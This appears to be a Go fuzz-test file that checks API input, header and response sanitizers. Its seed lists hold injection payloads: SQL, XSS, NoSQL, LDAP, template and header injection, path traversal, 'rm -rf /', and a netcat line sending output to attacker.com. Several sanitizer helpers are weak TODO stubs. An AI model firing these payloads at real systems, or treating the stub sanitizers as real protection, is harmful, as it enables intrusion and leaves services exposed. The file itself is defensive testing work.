package shared

import (
	"encoding/json"
	"strings"
	"testing"
	"unicode/utf8"
)

// FuzzAPIRequestValidation tests API request validation for injection attacks
func FuzzAPIRequestValidation(f *testing.F) {
	// Add seed corpus with API injection attack vectors
	seeds := []string{
		// JSON injection attacks
		`{"key": "value'; DROP TABLE users; --"}`,
		`{"key": "value\"; system('rm -rf /'); //"}`,
		`{"script": "<script>alert(1)</script>"}`,
		`{"cmd": "$(whoami)"}`,
		`{"eval": "javascript:alert(document.cookie)"}`,
		
		// SQL injection in JSON values
		`{"id": "1'; DELETE FROM users; --"}`,
		`{"username": "admin'--"}`,
		`{"password": "' OR '1'='1"}`,
		`{"query": "UNION SELECT password FROM users"}`,
		
		// XSS injection in JSON
		`{"comment": "<img src=x onerror=alert(1)>"}`,
		`{"description": "'><script>evil()</script>"}`,
		`{"title": "javascript:alert('xss')"}`,
		
		// Command injection in JSON
		`{"filename": "file.txt; rm -rf /"}`,
		`{"path": "../../../etc/passwd"}`,
		`{"command": "ls | nc attacker.com 4444"}`,
		
		// NoSQL injection
		`{"id": {"$gt": ""}}`,
		`{"username": {"$ne": null}}`,
		`{"password": {"$regex": ".*"}}`,
		
		// LDAP injection in JSON
		`{"cn": "*)(uid=*))(|(uid=*"}`,
		`{"filter": "admin)(|(password=*)"}`,
		
		// Prototype pollution
		`{"__proto__": {"isAdmin": true}}`,
		`{"constructor": {"prototype": {"evil": true}}}`,
		
		// Buffer overflow in JSON
		`{"data": "` + strings.Repeat("A", 100000) + `"}`,
		`{"` + strings.Repeat("k", 10000) + `": "value"}`,
		
		// Unicode attacks in JSON
		`{"unicode": "café"}`, // Basic Unicode
		`{"mixed": "аdmin"}`, // Mixed Cyrillic/Latin
		`{"rtl": "admin\u202e"}`, // Right-to-left override
		`{"bom": "admin\ufeff"}`, // BOM injection
		
		// Null byte injection
		`{"data": "safe\u0000malicious"}`,
		`{"path": "file.txt\u0000../../etc/passwd"}`,
		
		// JSON bombs (deeply nested)
		strings.Repeat(`{"nested":`, 1000) + `"bomb"` + strings.Repeat(`}`, 1000),
		
		// Invalid JSON (should be rejected)
		`{"incomplete": }`,
		`{malformed json}`,
		`{"unclosed": "value`,
		
		// Valid JSON (should pass)
		`{"valid": "data"}`,
		`{"user": {"name": "john", "age": 30}}`,
		`{"array": [1, 2, 3]}`,
		`{}`,
		``,
	}
	
	for _, seed := range seeds {
		f.Add(seed)
	}
	
	f.Fuzz(func(t *testing.T, jsonData string) {
		// Test JSON parsing security
		var parsed interface{}
		err := json.Unmarshal([]byte(jsonData), &parsed)
		if err != nil {
			// Invalid JSON should be rejected gracefully
			return
		}
		
		// Test API request validation
		isValid := validateAPIRequest(jsonData)
		_ = isValid
		
		// Test JSON sanitization
		sanitized := sanitizeJSONInput(jsonData)
		if containsScriptInjection(sanitized) {
			t.Error("Sanitized JSON contains script injection")
		}
		
		// Test size validation
		if len(jsonData) > 0 {
			isValidSize := validateRequestSize(len(jsonData))
			_ = isValidSize
		}
		
		// Test prototype pollution protection
		if hasPrototypePollution(parsed) {
			t.Error("JSON input contains prototype pollution attempt")
		}
		
		// Test nested object depth
		depth := calculateJSONDepth(parsed)
		if depth > 100 {
			t.Error("JSON input has excessive nesting depth")
		}
		
		// Test field validation
		if parsedMap, ok := parsed.(map[string]interface{}); ok {
			for key, value := range parsedMap {
				if containsDangerousPatterns(key) {
					t.Errorf("JSON key contains dangerous pattern: %s", key)
				}
				if str, ok := value.(string); ok && containsDangerousPatterns(str) {
					t.Errorf("JSON value contains dangerous pattern: %s", str)
				}
			}
		}
	})
}

// FuzzAPIParameterValidation tests API parameter validation
func FuzzAPIParameterValidation(f *testing.F) {
	seeds := []string{
		// SQL injection in parameters
		"'; DROP TABLE users; --",
		"' OR '1'='1",
		"UNION SELECT password FROM users",
		"1; DELETE FROM accounts",
		
		// XSS in parameters
		"<script>alert(1)</script>",
		"javascript:alert(document.cookie)",
		"'><img src=x onerror=alert(1)>",
		"\"><script>evil()</script>",
		
		// Command injection
		"; rm -rf /",
		"| cat /etc/passwd",
		"$(whoami)",
		"`id`",
		"&& malicious",
		
		// Path traversal
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc//passwd",
		
		// LDAP injection
		"*)(uid=*))(|(uid=*",
		"admin)(|(password=*)",
		
		// Template injection
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
		"{{config.items()}}",
		
		// Format string attacks
		"%s%s%s%s",
		"%n%n%n%n",
		"%x%x%x%x",
		
		// Buffer overflow
		strings.Repeat("A", 100000),
		strings.Repeat("💀", 10000), // Unicode bomb
		
		// Unicode attacks
		"аdmin", // Cyrillic characters
		"admin\u202e", // RTL override
		"admin\ufeff", // BOM
		
		// Null byte injection
		"value\x00injected",
		"safe\x00../../etc/passwd",
		
		// Email injection
		"user@example.com\nBcc: attacker@evil.com",
		"user@example.com\r\nTo: victim@target.com",
		
		// URL manipulation
		"http://example.com@evil.com/",
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		
		// Valid parameters
		"valid_parameter",
		"user@example.com",
		"12345",
		"normal-value_123",
		"",
	}
	
	for _, seed := range seeds {
		f.Add(seed)
	}
	
	f.Fuzz(func(t *testing.T, param string) {
		// Test parameter validation
		isValid := validateAPIParameter(param)
		_ = isValid
		
		// Test parameter sanitization
		sanitized := sanitizeAPIParameter(param)
		if containsInjectionAttempts(sanitized) {
			t.Error("Sanitized parameter contains injection attempts")
		}
		
		// Test parameter encoding
		encoded := encodeAPIParameter(param)
		if !utf8.ValidString(encoded) {
			t.Error("Encoded parameter is not valid UTF-8")
		}
		
		// Test parameter length validation
		if len(param) > 0 {
			isValidLength := validateParameterLength(param)
			_ = isValidLength
		}
		
		// Test specific injection types
		if containsSQLInjection(param) {
			sqlSafe := makeSQLSafe(param)
			if stillContainsSQLInjection(sqlSafe) {
				t.Error("Failed to make parameter SQL-safe")
			}
		}
		
		if containsXSSAttempt(param) {
			xssSafe := makeXSSSafe(param)
			if stillContainsXSS(xssSafe) {
				t.Error("Failed to make parameter XSS-safe")
			}
		}
	})
}

// FuzzAPIHeaderValidation tests API header validation
func FuzzAPIHeaderValidation(f *testing.F) {
	seeds := []string{
		// Header injection
		"value\r\nX-Injected: evil",
		"value\nSet-Cookie: session=hijacked",
		"value\r\n\r\n<script>alert(1)</script>",
		
		// Authentication header attacks
		"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJhdHRhY2tlciJ9.",
		"Basic YWRtaW46cGFzc3dvcmQ=", // admin:password
		"Basic $(echo malicious | base64)",
		
		// Content-Type attacks
		"application/json; charset=utf-8\r\nX-Evil: injection",
		"text/html\r\n\r\n<script>alert(1)</script>",
		"application/x-www-form-urlencoded; boundary=--evil",
		
		// User-Agent attacks
		"Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1",
		"<script>alert(1)</script>",
		"$(whoami) Browser",
		
		// Custom header attacks
		"api-key\r\nAuthorization: Bearer stolen_token",
		"correlation-id'; DROP TABLE logs; --",
		
		// Unicode in headers
		"válue", // Unicode characters
		"value\u000a", // Unicode line separator
		"value\u2028", // Line separator
		
		// Binary data in headers
		"value\x00\x01\x02",
		"\x7f\x80\x81",
		
		// Long headers (DoS)
		strings.Repeat("A", 65536),
		
		// Valid headers
		"application/json",
		"Bearer valid_token_123",
		"en-US,en;q=0.9",
		"gzip, deflate, br",
		"",
	}
	
	for _, seed := range seeds {
		f.Add(seed)
	}
	
	f.Fuzz(func(t *testing.T, headerValue string) {
		// Test header validation
		isValid := validateAPIHeader(headerValue)
		_ = isValid
		
		// Test header sanitization
		sanitized := sanitizeAPIHeader(headerValue)
		if containsHeaderInjection(sanitized) {
			t.Error("Sanitized header contains injection")
		}
		
		// Test header encoding validation
		if !isValidHeaderEncoding(headerValue) {
			return // Invalid encoding should be rejected
		}
		
		// Test header length limits
		if len(headerValue) > 8192 {
			return // Oversized headers should be rejected
		}
		
		// Test specific header types
		if isAuthHeader(headerValue) {
			token := extractToken(headerValue)
			if !isValidToken(token) {
				t.Error("Invalid token in auth header")
			}
		}
		
		if isContentTypeHeader(headerValue) {
			mediaType := extractMediaType(headerValue)
			if !isAllowedMediaType(mediaType) {
				t.Error("Disallowed media type in Content-Type header")
			}
		}
	})
}

// FuzzAPIResponseSanitization tests API response sanitization
func FuzzAPIResponseSanitization(f *testing.F) {
	seeds := []string{
		// XSS in responses
		`{"message": "<script>alert(1)</script>"}`,
		`{"error": "'><img src=x onerror=alert(1)>"}`,
		`{"data": "javascript:alert(document.cookie)"}`,
		
		// Sensitive data exposure
		`{"password": "secret123"}`,
		`{"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"}`,
		`{"credit_card": "4111-1111-1111-1111"}`,
		`{"ssn": "123-45-6789"}`,
		
		// Path disclosure
		`{"error": "File not found: /etc/passwd"}`,
		`{"path": "/usr/local/app/config/database.yml"}`,
		`{"stackTrace": "Error at /home/user/.ssh/id_rsa:123"}`,
		
		// Information disclosure
		`{"version": "1.0.0-beta", "debug": true}`,
		`{"database": "postgresql://user:pass@localhost/db"}`,
		`{"internal_id": "user_12345_internal"}`,
		
		// Unicode in responses
		`{"message": "Errör occurred"}`,
		`{"data": "vаlue"}`, // Mixed scripts
		
		// Large responses (DoS)
		`{"data": "` + strings.Repeat("A", 1000000) + `"}`,
		
		// Valid responses
		`{"success": true, "data": {"id": 1, "name": "John"}}`,
		`{"error": "Invalid input provided"}`,
		`{"status": "OK"}`,
		"",
	}
	
	for _, seed := range seeds {
		f.Add(seed)
	}
	
	f.Fuzz(func(t *testing.T, response string) {
		// Test response sanitization
		sanitized := sanitizeAPIResponse(response)
		
		// Check for XSS removal
		if containsXSSPatterns(sanitized) {
			t.Error("Sanitized response contains XSS patterns")
		}
		
		// Check for sensitive data removal
		if containsSensitiveData(sanitized) {
			t.Error("Sanitized response contains sensitive data")
		}
		
		// Check for path disclosure
		if containsPathDisclosure(sanitized) {
			t.Error("Sanitized response contains path disclosure")
		}
		
		// Test response size limits
		if len(sanitized) > 10000000 { // 10MB
			t.Error("Sanitized response exceeds size limit")
		}
		
		// Test JSON validity after sanitization
		if isJSONResponse(sanitized) {
			var parsed interface{}
			if err := json.Unmarshal([]byte(sanitized), &parsed); err != nil {
				t.Error("Sanitized JSON response is invalid")
			}
		}
	})
}

// Helper functions that should be implemented

func validateAPIRequest(jsonData string) bool {
	// TODO: Implement API request validation
	return len(jsonData) < 1000000 && utf8.ValidString(jsonData)
}

func sanitizeJSONInput(jsonData string) string {
	// TODO: Implement JSON input sanitization
	return strings.ReplaceAll(jsonData, "<script>", "")
}

func containsScriptInjection(input string) bool {
	patterns := []string{"<script>", "javascript:", "onclick=", "onerror="}
	lower := strings.ToLower(input)
	for _, pattern := range patterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

func validateRequestSize(size int) bool {
	return size <= 1000000 // 1MB limit
}

func hasPrototypePollution(data interface{}) bool {
	if m, ok := data.(map[string]interface{}); ok {
		for key := range m {
			if strings.Contains(strings.ToLower(key), "__proto__") ||
				strings.Contains(strings.ToLower(key), "constructor") ||
				strings.Contains(strings.ToLower(key), "prototype") {
				return true
			}
		}
	}
	return false
}

func calculateJSONDepth(data interface{}) int {
	// TODO: Implement depth calculation
	switch v := data.(type) {
	case map[string]interface{}:
		maxDepth := 0
		for _, value := range v {
			depth := calculateJSONDepth(value)
			if depth > maxDepth {
				maxDepth = depth
			}
		}
		return maxDepth + 1
	case []interface{}:
		maxDepth := 0
		for _, value := range v {
			depth := calculateJSONDepth(value)
			if depth > maxDepth {
				maxDepth = depth
			}
		}
		return maxDepth + 1
	default:
		return 1
	}
}

func containsDangerousPatterns(input string) bool {
	patterns := []string{
		"<script>", "javascript:", "'; DROP", "$(", "`",
		"../", "..\\", "\x00", "rm -rf", "cat /etc/passwd",
	}
	lower := strings.ToLower(input)
	for _, pattern := range patterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

func validateAPIParameter(param string) bool {
	return len(param) <= 4096 && !strings.Contains(param, "\x00")
}

func sanitizeAPIParameter(param string) string {
	// TODO: Implement parameter sanitization
	param = strings.ReplaceAll(param, "\x00", "")
	param = strings.ReplaceAll(param, "<script>", "")
	return param
}

func containsInjectionAttempts(input string) bool {
	return containsDangerousPatterns(input)
}

func encodeAPIParameter(param string) string {
	// TODO: Implement parameter encoding
	return param
}

func validateParameterLength(param string) bool {
	return len(param) <= 4096
}

func containsSQLInjection(input string) bool {
	patterns := []string{"'; drop", "' or '1'='1", "union select", "delete from"}
	lower := strings.ToLower(input)
	for _, pattern := range patterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

func makeSQLSafe(input string) string {
	// TODO: Implement SQL injection protection
	return strings.ReplaceAll(input, "'", "''")
}

func stillContainsSQLInjection(input string) bool {
	return containsSQLInjection(input)
}

func containsXSSAttempt(input string) bool {
	return containsScriptInjection(input)
}

func makeXSSSafe(input string) string {
	// TODO: Implement XSS protection
	input = strings.ReplaceAll(input, "<", "&lt;")
	input = strings.ReplaceAll(input, ">", "&gt;")
	return input
}

func stillContainsXSS(input string) bool {
	return strings.Contains(input, "<script>")
}

func validateAPIHeader(headerValue string) bool {
	return !strings.Contains(headerValue, "\r") && 
		   !strings.Contains(headerValue, "\n") && 
		   len(headerValue) <= 8192
}

func sanitizeAPIHeader(headerValue string) string {
	// TODO: Implement header sanitization
	headerValue = strings.ReplaceAll(headerValue, "\r", "")
	headerValue = strings.ReplaceAll(headerValue, "\n", "")
	return headerValue
}

func containsHeaderInjection(input string) bool {
	return strings.Contains(input, "\r") || strings.Contains(input, "\n")
}

func isValidHeaderEncoding(headerValue string) bool {
	return utf8.ValidString(headerValue)
}

func isAuthHeader(headerValue string) bool {
	return strings.HasPrefix(strings.ToLower(headerValue), "bearer ") ||
		   strings.HasPrefix(strings.ToLower(headerValue), "basic ")
}

func extractToken(headerValue string) string {
	parts := strings.SplitN(headerValue, " ", 2)
	if len(parts) == 2 {
		return parts[1]
	}
	return ""
}

func isValidToken(token string) bool {
	return len(token) > 0 && !strings.Contains(token, " ")
}

func isContentTypeHeader(headerValue string) bool {
	return strings.Contains(strings.ToLower(headerValue), "application/") ||
		   strings.Contains(strings.ToLower(headerValue), "text/")
}

func extractMediaType(headerValue string) string {
	parts := strings.SplitN(headerValue, ";", 2)
	return strings.TrimSpace(parts[0])
}

func isAllowedMediaType(mediaType string) bool {
	allowed := []string{"application/json", "text/plain", "text/html"}
	for _, a := range allowed {
		if mediaType == a {
			return true
		}
	}
	return false
}

func sanitizeAPIResponse(response string) string {
	// TODO: Implement response sanitization
	response = strings.ReplaceAll(response, "<script>", "")
	response = strings.ReplaceAll(response, "password", "***")
	return response
}

func containsXSSPatterns(input string) bool {
	return containsScriptInjection(input)
}

func containsSensitiveData(input string) bool {
	sensitive := []string{"password", "token", "secret", "key", "credit_card", "ssn"}
	lower := strings.ToLower(input)
	for _, s := range sensitive {
		if strings.Contains(lower, s) {
			return true
		}
	}
	return false
}

func containsPathDisclosure(input string) bool {
	paths := []string{"/etc/", "/usr/", "/home/", "/var/", "c:\\", "c:/"}
	lower := strings.ToLower(input)
	for _, path := range paths {
		if strings.Contains(lower, path) {
			return true
		}
	}
	return false
}

func isJSONResponse(response string) bool {
	trimmed := strings.TrimSpace(response)
	return strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[")
}